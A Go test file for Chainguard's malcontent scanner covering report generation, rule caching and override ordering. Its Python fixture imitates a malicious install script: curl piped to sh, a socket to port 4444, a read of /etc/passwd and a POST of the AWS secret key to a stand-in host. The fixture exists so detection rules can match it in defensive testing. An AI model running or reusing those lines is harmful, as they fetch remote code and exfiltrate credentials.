// Copyright 2026 Chainguard, Inc.
// SPDX-License-Identifier: Apache-2.0

package report

import (
	"bytes"
	"io/fs"
	"maps"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/chainguard-dev/malcontent/pkg/malcontent"
	"github.com/chainguard-dev/malcontent/pkg/programkind"
	"github.com/chainguard-dev/malcontent/rules"
	thirdparty "github.com/chainguard-dev/malcontent/third_party"

	yarax "github.com/VirusTotal/yara-x/go"
)

// realRuleDirs are the first-party rule directories compiled, with the
// GuardDog rules, for tests and benchmarks that need realistic rules.
var realRuleDirs = []string{"discover", "exec", "fs", "net", "os", "process"}

// fixtureRuleSources cover report paths the real rules rarely reach: override
// rules that apply, that name a rule absent from the file, or both; a meta/
// rule; a YARA Forge style reference; malcontent's marker and capability
// metadata; unprintable matches; and rule names that change how matches
// render.
var fixtureRuleSources = map[string]string{
	"test/fixture/target.yara": `
rule fixture_target: high {
  strings:
    $a = "FIXTURE_TARGET"
  condition:
    $a
}`,
	"false_positives/fixture_fp.yara": `
rule fixture_fp: override {
  meta:
    description = "lowers the fixture target"
    fixture_target = "low"
  strings:
    $a = "FIXTURE_FP"
  condition:
    $a
}`,
	"false_positives/fixture_orphan.yara": `
rule fixture_orphan: override {
  meta:
    fixture_missing = "low"
  strings:
    $a = "FIXTURE_FP"
  condition:
    $a
}`,
	"false_positives/fixture_partial.yara": `
rule fixture_partial: override {
  meta:
    fixture_target = "medium"
    fixture_missing = "low"
  strings:
    $a = "FIXTURE_FP"
  condition:
    $a
}`,
	"meta/format/fixture.yara": `
rule fixture_meta {
  strings:
    $a = "FIXTURE_META"
  condition:
    $a
}`,
	"test/fixture/forge.yara": `
rule fixture_forge: high {
  meta:
    author = "@fixture"
    reference = "https://github.com/fixture"
    source_url = "https://github.com/fixture/rules/blob/main/forge.yar"
    __malcontent__ = "true"
    pledge = "inet"
    syscall = "socket,connect"
    cap = "CAP_NET_RAW"
  strings:
    $a = "FIXTURE_FORGE"
  condition:
    $a
}`,
	"test/fixture/xor_binary.yara": `
rule fixture_xor_binary: medium {
  strings:
    $h = { 00 01 02 03 }
    $t = "FIXTURE_XOR"
  condition:
    any of them
}`,
	"test/fixture/xml.yara": `
rule fixture_xml_key_val: medium {
  strings:
    $k = "<key>FIXTURE_KEY</key>"
  condition:
    $k
}`,
}

// fixtureTrailer triggers every rule in fixtureRuleSources. It repeats so
// each pattern matches more than once.
var fixtureTrailer = bytes.Repeat([]byte("\nFIXTURE_TARGET FIXTURE_FP FIXTURE_META FIXTURE_FORGE FIXTURE_XOR <key>FIXTURE_KEY</key> \x00\x01\x02\x03\n"), 3)

// pythonFixture resembles a malicious install script, so GuardDog's
// path-scoped rules and first-party script rules match it. It is only
// scanned, never run.
const pythonFixture = `import base64, os, socket, subprocess
import requests

payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik=")
exec(payload)
os.system("curl -s http://203.0.113.7:8080/x.sh | sh")
subprocess.Popen(["/bin/sh", "-c", "id"], stdout=subprocess.DEVNULL)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("203.0.113.7", 4444))
data = open("/etc/passwd").read()
requests.post("https://example.com/collect", data=os.environ.get("AWS_SECRET_ACCESS_KEY"))
`

// realRules compiles realRuleDirs, the GuardDog rules, and
// fixtureRuleSources once per test binary. The rules are never destroyed, so
// parallel tests and repeated benchmarks share them.
var realRules = sync.OnceValues(func() (*yarax.Rules, error) {
	sources := maps.Clone(fixtureRuleSources)
	for _, dir := range realRuleDirs {
		if err := addRuleSources(sources, rules.FS, dir); err != nil {
			return nil, err
		}
	}
	if err := addRuleSources(sources, thirdparty.FS, "yara/guarddog"); err != nil {
		return nil, err
	}
	return compileSources(sources)
})

// addRuleSources adds every rule file under root in fsys to sources, keyed
// by the path production uses as its namespace.
func addRuleSources(sources map[string]string, fsys fs.FS, root string) error {
	return fs.WalkDir(fsys, root, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		if ext := filepath.Ext(path); ext != ".yara" && ext != ".yar" {
			return nil
		}
		bs, err := fs.ReadFile(fsys, path)
		if err != nil {
			return err
		}
		sources[path] = string(bs)
		return nil
	})
}

func sharedRealRules(tb testing.TB) *yarax.Rules {
	tb.Helper()
	yrs, err := realRules()
	if err != nil {
		tb.Fatalf("compile rules: %v", err)
	}
	return yrs
}

// reportFixture is file content with the path and type Generate receives.
type reportFixture struct {
	name string
	path string
	kind *programkind.FileType
	data []byte
	// large fixtures are left out of tests that repeat Generate many times.
	large bool
}

// scriptFixture returns pythonFixture followed by fixtureTrailer.
func scriptFixture() reportFixture {
	return reportFixture{
		name: "setup.py",
		path: "/usr/src/pkg/setup.py",
		kind: &programkind.FileType{Ext: "py", MIME: "text/x-python"},
		data: append([]byte(pythonFixture), fixtureTrailer...),
	}
}

// reportFixtures returns real binaries and a script, each followed by
// fixtureTrailer.
func reportFixtures(tb testing.TB) []reportFixture {
	tb.Helper()
	read := func(name string) []byte {
		data, err := os.ReadFile(filepath.Join("..", "programkind", "testdata", name))
		if err != nil {
			tb.Fatalf("read fixture %s: %v", name, err)
		}
		return append(data, fixtureTrailer...)
	}
	elf := &programkind.FileType{Ext: "elf", MIME: "application/x-elf"}
	script := scriptFixture()
	repeated := script
	repeated.name, repeated.data, repeated.large = "setup.py-x200", bytes.Repeat(script.data, 200), true
	pathless := script
	pathless.name, pathless.path, pathless.kind = "pathless", "", nil
	return []reportFixture{
		{name: "ls", path: "/usr/bin/ls", kind: elf, data: read("ls")},
		{name: "libpam", path: "/usr/lib/libpam.so.0", kind: elf, data: read("libpam.so.0")},
		script,
		repeated,
		pathless,
	}
}

// generateCases are configurations that take different paths through
// Generate.
var generateCases = []struct {
	name string
	c    malcontent.Config
}{
	{"analyze", malcontent.Config{MinRisk: LOW}},
	{"analyze harmless ignoring self", malcontent.Config{MinRisk: HARMLESS, IgnoreSelf: true}},
	{"analyze ignoring tags and rules", malcontent.Config{MinRisk: LOW, IgnoreTags: []string{"medium"}, IgnoreRules: []string{"fixture_x*", "*_dns_*"}}},
	{"analyze OCI with trimmed prefixes", malcontent.Config{MinRisk: LOW, OCI: true, TrimPrefixes: []string{"/src"}}},
	{"scan", malcontent.Config{Scan: true, MinRisk: LOW, QuantityIncreasesRisk: true}},
	{"scan without quantity risk", malcontent.Config{Scan: true, MinRisk: HIGH}},
}

// generateReport returns the report the scan pipeline builds for fx: it runs
// HighestMatchRisk for scans, then Generate. It reports failures with Errorf
// so goroutines may call it.
func generateReport(tb testing.TB, fx reportFixture, mrs *yarax.ScanResults, c malcontent.Config) *malcontent.FileReport {
	tb.Helper()
	const expath = "/usr"
	highest := 0
	if c.Scan {
		highest = HighestMatchRisk(mrs, fx.kind, fx.path, expath, c)
	}
	fr, err := Generate(tb.Context(), fx.path, mrs, c, expath, nil, fx.data, int64(len(fx.data)), "cksum", fx.kind, highest)
	if err != nil {
		tb.Errorf("Generate(%s): %v", fx.name, err)
	}
	return fr
}

// TestGenerateRulesCacheMatchesUncached verifies that caching per-rule data
// for c.Rules leaves every report field unchanged. scanBuf uses a fresh
// scanner, which reports matches in declaration order, so both paths
// process them in the same order.
func TestGenerateRulesCacheMatchesUncached(t *testing.T) {
	t.Parallel()
	yrs := sharedRealRules(t)
	for _, fx := range reportFixtures(t) {
		mrs := scanBuf(t, yrs, fx.data)
		for _, tc := range generateCases {
			t.Run(fx.name+"/"+tc.name, func(t *testing.T) {
				t.Parallel()
				want := generateReport(t, fx, mrs, tc.c)
				cached := tc.c
				cached.Rules = yrs
				for _, pass := range []string{"first", "second"} {
					if got := generateReport(t, fx, mrs, cached); !reflect.DeepEqual(got, want) {
						t.Errorf("%s report with c.Rules:\ngot  = %+v\nwant = %+v", pass, got, want)
					}
				}
				if got, want := HighestMatchRisk(mrs, fx.kind, fx.path, "", cached), HighestMatchRisk(mrs, fx.kind, fx.path, "", tc.c); got != want {
					t.Errorf("HighestMatchRisk with c.Rules: got = %d, want = %d", got, want)
				}
			})
		}
	}
}

// TestGenerateFixtureCoverage pins what the fixture rules contribute, so the
// cache comparison above keeps covering overrides, meta rules, file
// attributes, and match rendering.
func TestGenerateFixtureCoverage(t *testing.T) {
	t.Parallel()
	yrs := sharedRealRules(t)
	fx := scriptFixture()
	c := malcontent.Config{MinRisk: HARMLESS, Rules: yrs}
	fr := generateReport(t, fx, scanBuf(t, yrs, fx.data), c)

	byRule := make(map[string]*malcontent.Behavior, len(fr.Behaviors))
	guardDog := false
	for _, b := range fr.Behaviors {
		byRule[b.RuleName] = b
		guardDog = guardDog || strings.HasPrefix(b.ID, "3P/guarddog/")
	}
	if !guardDog {
		t.Errorf("behaviors: no GuardDog behavior among %v", reportSortedNames(fr))
	}

	overrides := make([]string, 0, len(fr.Overrides))
	for _, o := range fr.Overrides {
		overrides = append(overrides, o.RuleName+">"+strings.Join(o.Override, ",")+"="+o.RiskLevel)
	}
	slices.Sort(overrides)
	if want := []string{"fixture_fp>fixture_target=LOW", "fixture_partial>fixture_target=MEDIUM"}; !slices.Equal(overrides, want) {
		t.Errorf("overrides: got = %v, want = %v", overrides, want)
	}
	if want := map[string]string{"format": "fixture"}; !maps.Equal(fr.Meta, want) {
		t.Errorf("Meta: got = %v, want = %v", fr.Meta, want)
	}
	if !fr.IsMalcontent {
		t.Error("IsMalcontent: got = false, want = true")
	}
	for _, tc := range []struct {
		field string
		got   []string
		want  string
	}{
		{"Pledge", fr.Pledge, "inet"},
		{"Syscalls", fr.Syscalls, "connect"},
		{"Syscalls", fr.Syscalls, "socket"},
		{"Capabilities", fr.Capabilities, "CAP_NET_RAW"},
	} {
		if !slices.Contains(tc.got, tc.want) {
			t.Errorf("%s: got = %v, want to contain %q", tc.field, tc.got, tc.want)
		}
	}

	if b := byRule["fixture_forge"]; b == nil {
		t.Error("fixture_forge: no behavior")
	} else if b.RuleAuthor != "fixture" || b.RuleAuthorURL != "https://github.com/fixture" || b.ReferenceURL != "" {
		t.Errorf("fixture_forge author: got = %q, %q, %q, want = %q, %q, %q", b.RuleAuthor, b.RuleAuthorURL, b.ReferenceURL, "fixture", "https://github.com/fixture", "")
	}
	for rule, want := range map[string][]string{
		"fixture_xor_binary":  {"fixture_xor_binary::FIXTURE_XOR", "fixture_xor_binary::$h", "fixture_xor_binary::$t"},
		"fixture_xml_key_val": {"FIXTURE_KEY"},
	} {
		if b := byRule[rule]; b == nil {
			t.Errorf("%s: no behavior", rule)
		} else if !slices.Equal(b.MatchStrings, want) {
			t.Errorf("%s MatchStrings: got = %q, want = %q", rule, b.MatchStrings, want)
		}
	}
}

// TestGenerateSharedResultsConcurrently runs Generate from many goroutines on
// shared scan results from two rule sets, so the rule information caches of
// both are built and read concurrently.
func TestGenerateSharedResultsConcurrently(t *testing.T) {
	t.Parallel()
	sets := []*yarax.Rules{sharedRealRules(t), compileTestRules(t, fixtureRuleSources)}

	type job struct {
		fx   reportFixture
		mrs  *yarax.ScanResults
		c    malcontent.Config
		want *malcontent.FileReport
	}
	var jobs []job
	for _, fx := range reportFixtures(t) {
		if fx.large {
			continue
		}
		for _, yrs := range sets {
			mrs := scanBuf(t, yrs, fx.data)
			for _, tc := range generateCases {
				c := tc.c
				want := generateReport(t, fx, mrs, c)
				c.Rules = yrs
				jobs = append(jobs, job{fx: fx, mrs: mrs, c: c, want: want})
			}
		}
	}

	const workers = 8
	var wg sync.WaitGroup
	for w := range workers {
		wg.Go(func() {
			for i := range jobs {
				j := jobs[(i+w*len(jobs)/workers)%len(jobs)]
				if got := generateReport(t, j.fx, j.mrs, j.c); !reflect.DeepEqual(got, j.want) {
					t.Errorf("%s report from worker %d differs from the serial report", j.fx.name, w)
				}
			}
		})
	}
	wg.Wait()
}

// orderRuleSources declare rules whose processing order changes a report:
// two namespaces that share a behavior ID at equal risk, two override rules
// that set one target to different severities, and malcontent's own rule,
// which keeps later low-risk rules (and their syscalls) when IgnoreSelf is
// set. Namespaces are declared in sorted order.
var orderRuleSources = map[string]string{
	"order/a.yara":        `rule order_early_low: low { meta: syscall = "early" strings: $a = "ORDER_EARLY" condition: $a }`,
	"order/shared":        `rule order_shared_first: medium { strings: $a = "ORDER_SHARED" condition: $a }`,
	"order/shared.yara":   `rule order_shared_second: medium { meta: description = "a description longer than the first" strings: $a = "ORDER_SHARED" $b = "ORDER_SECOND" condition: any of them }`,
	"order/target.yara":   `rule order_target: high { strings: $a = "ORDER_TARGET" condition: $a }`,
	"order/z_fp_one.yara": `rule order_fp_one: override { meta: order_target = "low" strings: $a = "ORDER_FP_ONE" condition: $a }`,
	"order/z_fp_two.yara": `rule order_fp_two: override { meta: order_target = "medium" strings: $a = "ORDER_FP_TWO" condition: $a }`,
	"order/zz_self.yara":  `rule malcontent: harmless { strings: $a = "ORDER_SELF" condition: $a }`,
	"order/zzz_low.yara":  `rule order_late_low: low { meta: syscall = "late" strings: $a = "ORDER_LATE" condition: $a }`,
}

const orderInput = "ORDER_EARLY ORDER_SHARED ORDER_SECOND ORDER_TARGET ORDER_FP_ONE ORDER_FP_TWO ORDER_SELF ORDER_LATE"

func matchingRuleNames(mrs *yarax.ScanResults) []string {
	names := make([]string, 0, len(mrs.MatchingRules()))
	for _, m := range mrs.MatchingRules() {
		names = append(names, m.Identifier())
	}
	return names
}

// TestGenerateFollowsDeclarationOrder verifies that a scanner reused across
// files, which reports matches in an order shaped by its earlier scans,
// yields the same report as a fresh scanner when c.Rules is set.
func TestGenerateFollowsDeclarationOrder(t *testing.T) {
	t.Parallel()
	yrs := compileTestRules(t, orderRuleSources)
	full := []byte(orderInput)
	fresh := scanBuf(t, yrs, full)

	scanner := yarax.NewScanner(yrs)
	t.Cleanup(scanner.Destroy)
	for _, earlier := range []string{"ORDER_LATE ORDER_SECOND", "ORDER_SELF ORDER_FP_TWO"} {
		if _, err := scanner.Scan([]byte(earlier)); err != nil {
			t.Fatalf("scan %q: %v", earlier, err)
		}
	}
	reused, err := scanner.Scan(full)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if got, want := matchingRuleNames(reused), matchingRuleNames(fresh); slices.Equal(got, want) {
		t.Errorf("reused scanner order: got = %v, want an order other than %v, or this test covers nothing", got, want)
	}

	fx := reportFixture{name: "order", path: "/tmp/order", data: full}
	c := malcontent.Config{IgnoreSelf: true, MinRisk: MEDIUM, Rules: yrs}
	want := generateReport(t, fx, fresh, c)
	if got := generateReport(t, fx, reused, c); !reflect.DeepEqual(got, want) {
		t.Errorf("report from reused scanner:\ngot  = %+v\nwant = %+v", got, want)
	}

	// Declaration order keeps the first of two equal-risk behaviors with the
	// longer description, lets the later override win, and keeps only the
	// low-risk rule declared after malcontent's own.
	byID := make(map[string]*malcontent.Behavior, len(want.Behaviors))
	for _, b := range want.Behaviors {
		byID[b.ID] = b
	}
	if b := byID["order/shared"]; b == nil || b.RuleName != "order_shared_first" || b.Description != "a description longer than the first" {
		t.Errorf("order/shared behavior: got = %+v, want rule %q with the longer description", b, "order_shared_first")
	}
	if b := byID["order/target"]; b == nil || b.RiskScore != MEDIUM {
		t.Errorf("order/target behavior: got = %+v, want RiskScore %d", b, MEDIUM)
	}
	if got, want := want.Syscalls, []string{"late"}; !slices.Equal(got, want) {
		t.Errorf("Syscalls: got = %v, want = %v", got, want)
	}
}

// TestGenerateTieKeepsFirstDeclared pins that of two rules in one file with
// equal risk, the behavior comes from the rule declared first.
func TestGenerateTieKeepsFirstDeclared(t *testing.T) {
	t.Parallel()
	yrs := compileTestRules(t, map[string]string{"tie/rules.yara": `
rule tie_zeta: medium {
  strings:
    $a = "TIE_ZETA"
  condition:
    $a
}

rule tie_alpha: medium {
  strings:
    $a = "TIE_ALPHA"
  condition:
    $a
}`})
	full := []byte("TIE_ZETA TIE_ALPHA")
	scanner := yarax.NewScanner(yrs)
	t.Cleanup(scanner.Destroy)
	if _, err := scanner.Scan([]byte("TIE_ALPHA")); err != nil {
		t.Fatalf("scan: %v", err)
	}
	reused, err := scanner.Scan(full)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}

	fx := reportFixture{name: "tie", path: "/tmp/tie", data: full}
	for _, tc := range []struct {
		name string
		mrs  *yarax.ScanResults
		c    malcontent.Config
	}{
		{"fresh scanner with c.Rules", scanBuf(t, yrs, full), malcontent.Config{MinRisk: LOW, Rules: yrs}},
		{"fresh scanner without c.Rules", scanBuf(t, yrs, full), malcontent.Config{MinRisk: LOW}},
		{"reused scanner with c.Rules", reused, malcontent.Config{MinRisk: LOW, Rules: yrs}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			fr := generateReport(t, fx, tc.mrs, tc.c)
			if len(fr.Behaviors) != 1 || fr.Behaviors[0].RuleName != "tie_zeta" {
				t.Errorf("behaviors: got = %v, want only %q", reportSortedNames(fr), "tie_zeta")
			}
		})
	}
}

// BenchmarkGenerate measures report generation for real binaries and a
// script against a realistic rule subset. Scan results are computed once and
// shared, as a content-keyed result cache would.
func BenchmarkGenerate(b *testing.B) {
	yrs := sharedRealRules(b)
	for _, fx := range reportFixtures(b) {
		mrs := scanBuf(b, yrs, fx.data)
		for _, bc := range []struct {
			name string
			c    malcontent.Config
		}{
			{"analyze", malcontent.Config{MinRisk: LOW, Rules: yrs}},
			{"analyze-uncached", malcontent.Config{MinRisk: LOW}},
			{"scan", malcontent.Config{Scan: true, MinRisk: LOW, QuantityIncreasesRisk: true, Rules: yrs}},
		} {
			highest := 0
			if bc.c.Scan {
				highest = HighestMatchRisk(mrs, fx.kind, fx.path, "", bc.c)
			}
			size := int64(len(fx.data))
			b.Run(fx.name+"/"+bc.name, func(b *testing.B) {
				b.ReportAllocs()
				b.ReportMetric(float64(len(mrs.MatchingRules())), "rules")
				for b.Loop() {
					if _, err := Generate(b.Context(), fx.path, mrs, bc.c, "", nil, fx.data, size, "cksum", fx.kind, highest); err != nil {
						b.Fatal(err)
					}
				}
			})
		}
	}
}

// BenchmarkHighestMatchRisk measures the scan-mode risk pre-check.
func BenchmarkHighestMatchRisk(b *testing.B) {
	yrs := sharedRealRules(b)
	for _, fx := range reportFixtures(b) {
		mrs := scanBuf(b, yrs, fx.data)
		for _, bc := range []struct {
			name string
			c    malcontent.Config
		}{
			{"cached", malcontent.Config{Scan: true, Rules: yrs}},
			{"uncached", malcontent.Config{Scan: true}},
		} {
			b.Run(fx.name+"/"+bc.name, func(b *testing.B) {
				b.ReportAllocs()
				for b.Loop() {
					HighestMatchRisk(mrs, fx.kind, fx.path, "", bc.c)
				}
			})
		}
	}
}
